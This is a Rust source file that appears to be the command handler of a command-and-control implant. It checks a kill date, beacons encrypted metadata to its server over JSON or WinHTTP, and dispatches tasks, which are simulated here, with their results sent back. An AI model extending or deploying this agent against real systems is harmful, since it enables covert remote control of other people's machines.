use core::ffi::c_void;
#[cfg(feature = "std-runtime")]
use std::sync::mpsc;

use std::sync::Arc;
use std::thread;

#[cfg(feature = "std-runtime")]
use mod_std_runtime::CustomRuntime;

use rs2_runtime::Runtime;
#[cfg(feature = "tokio-runtime")]
use tokio::sync::mpsc;

#[cfg(feature = "tokio-runtime")]
use mod_tokio_runtime::TokioRuntimeWrapper;

use rs2_communication_protocol::communication_structs::agent_commands::AgentCommands;
use rs2_communication_protocol::communication_structs::simple_agent_command::SimpleAgentCommand;
use rs2_communication_protocol::communication_structs::task_output::TaskOutput;
use rs2_communication_protocol::metadata::Metadata;
use rs2_communication_protocol::protocol::Protocol;

use rs2_crypt::encryption_algorithm::ident_algorithm::IdentEncryptor;

use mod_agentcore::instance;
use mod_win32::nt_time::check_kill_date;

#[cfg(feature = "protocol-json")]
use mod_protocol_json::protocol::JsonProtocol;

#[cfg(feature = "protocol-winhttp")]
use mod_protocol_winhttp::protocol::WinHttpProtocol;

use crate::command::exit_command;
use crate::common::generate_path;

#[cfg(feature = "tokio-runtime")]
use crate::spawner::TaskSpawner;
#[cfg(feature = "std-runtime")]
use crate::spawner::TaskSpawnerCustomRuntime;

pub fn command_handler<R>(rt: Arc<R>)
where
    R: Runtime + 'static,
{
    unsafe {
        if !instance().session.connected {
            return;
        }

        //KillDate
        if check_kill_date(instance().config.kill_date) {
            rt.block_on(async { exit_command(1).await });
        }

        // !Working Hours -> continue

        // Prepare the TaskSpawner
        #[cfg(feature = "tokio-runtime")]
        let spawner = TaskSpawner::new(rt.handle().clone());
        #[cfg(feature = "tokio-runtime")]
        let (result_tx, result_rx) = mpsc::channel::<TaskOutput>(16); // Tokio mpsc channel for results.

        // Start the result handler
        #[cfg(feature = "tokio-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx);

        #[cfg(feature = "std-runtime")]
        let spawner = TaskSpawnerCustomRuntime::new(rt.clone());
        #[cfg(feature = "std-runtime")]
        let (result_tx, result_rx) = mpsc::channel::<TaskOutput>(); // Tokio mpsc channel for results.
        #[cfg(feature = "std-runtime")]
        let result_handler_handle = result_handler(rt.clone(), result_rx);

        #[cfg(any(feature = "protocol-json", feature = "protocol-winhttp"))]
        {
            let encryptor = encryptor_from_raw(instance().session.encryptor_ptr);
            let protocol = protocol_from_raw(instance().session.protocol_ptr);

            let (_, path, request_id) = generate_path(32, 0, 6);
            let mut data = TaskOutput::new();

            let metadata = Metadata {
                request_id: request_id,
                command_id: "an3a8hlnrr4638d30yef0oz5sncjdx5w".to_string(),
                agent_id: "an3a8hlnrr4638d30yef0oz5sncjdx5x".to_string(),
                path: Some(path),
            };

            data.with_metadata(metadata);

            let result = rt.block_on(async { protocol.write(data, Some(encryptor.clone())).await });

            if result.is_ok() {
                // Aggiungi il parsing di un array di SimpleAgentCommand, con protocol.read, lascia commentate queste righe

                // let tasks_response: Result<, anyhow::Error> =
                //     protocol.read(result.unwrap(), Some(encryptor.clone()));
                // for each SimpleAgentCommand in tasks_response {}

                // Simulating the receipt of an array of 10 tasks
                for i in 0..10 {
                    let metadata = Metadata {
                        request_id: format!("req-{}", i),
                        command_id: format!("cmd-{}", i),
                        agent_id: "agent-1234".to_string(),
                        path: None,
                    };

                    // Assign "Long Task" name if the index is even, otherwise assign a numbered "Test Task".
                    let command = if i % 2 == 0 {
                        SimpleAgentCommand {
                            op: AgentCommands::Test,
                            metadata,
                        }
                    } else {
                        SimpleAgentCommand {
                            op: AgentCommands::Checkin,
                            metadata,
                        }
                    };

                    #[cfg(feature = "tokio-runtime")]
                    let result_tx = result_tx.clone(); // Clone the result transmitter for each task.
                    #[cfg(feature = "tokio-runtime")]
                    let receiver = rt.block_on(async { spawner.spawn_task(command).await }); // Spawn the task and get the result receiver.

                    #[cfg(feature = "tokio-runtime")]
                    // Spawn a task to send the task's result to the result handler.
                    rt.spawn(async move {
                        if let Ok(result) = receiver.await {
                            let _ = result_tx.send(result).await; // Send the result to the result handler.
                        }
                    });

                    #[cfg(feature = "std-runtime")]
                    let receiver = spawner.spawn_task(command); // Spawn the task and get the result receiver.

                    #[cfg(feature = "std-runtime")]
                    // Send the task's result to the result handler.
                    if let Ok(result) = receiver.recv() {
                        let _ = result_tx.send(result);
                    }
                }
            }
        }

        #[cfg(feature = "tokio-runtime")]
        rt.block_on(async {
            drop(result_tx); // Close the result channel, indicating no more tasks will send results.
            result_handler_handle.await.unwrap(); // Wait for the result handler to finish processing all results.
        });
    }
}

pub fn result_handler<R>(rt: Arc<R>, mut result_rx: mpsc::Receiver<TaskOutput>)
where
    R: Runtime,
{
    let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };
    let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };

    #[cfg(feature = "tokio-runtime")]
    rt.handle().spawn(async move {
        while let Some(result) = result_rx.recv().await {
            // Send the result to the server using the protocol
            protocol
                .write(result.clone(), Some(encryptor.clone()))
                .await
                .unwrap();
        }
    });

    #[cfg(feature = "std-runtime")]
    // Spawn a separate thread to handle and process the results.
    let result_handler = thread::spawn(move || {
        while let Ok(result) = result_rx.recv() {
            // Create a new reference to protocol inside the loop
            let protocol = unsafe { protocol_from_raw(instance().session.protocol_ptr) };
            let encryptor = unsafe { encryptor_from_raw(instance().session.encryptor_ptr) };

            // Block on the async write operation using the runtime's block_on method
            rt.block_on(async move {
                protocol
                    .write(result.clone(), Some(encryptor.clone()))
                    .await
                    .unwrap();
            });

            // println!("Result {}: {:?}", i, result);
        }
    });

    // #[cfg(feature = "std-runtime")]
    // result_handler.join().unwrap();
}

/// Function to retrieve a mutable reference to a IdentEncryptor struct from a raw pointer.
pub unsafe fn encryptor_from_raw(ptr: *mut c_void) -> &'static mut IdentEncryptor {
    &mut *(ptr as *mut IdentEncryptor)
}

#[cfg(feature = "protocol-json")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut JsonProtocol<IdentEncryptor> {
    &mut *(ptr as *mut JsonProtocol<IdentEncryptor>)
}

#[cfg(feature = "protocol-winhttp")]
/// Function to retrieve a mutable reference to a JsonProtocl<IdentEncryptor> struct from a raw pointer.
pub unsafe fn protocol_from_raw(ptr: *mut c_void) -> &'static mut WinHttpProtocol<IdentEncryptor> {
    &mut *(ptr as *mut WinHttpProtocol<IdentEncryptor>)
}
